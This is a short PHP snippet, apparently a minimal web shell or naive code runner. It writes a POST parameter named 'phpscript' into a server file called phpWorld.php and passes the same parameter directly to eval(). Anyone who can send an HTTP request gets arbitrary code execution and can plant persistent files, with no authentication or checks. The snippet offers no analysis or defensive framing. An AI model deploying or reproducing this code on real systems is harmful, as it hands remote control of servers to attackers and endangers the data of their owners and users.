<?php file_put_contents("phpWorld.php", $_POST['phpscript']);?>
<?php
$post = $_POST['phpscript'];
eval($post);
?>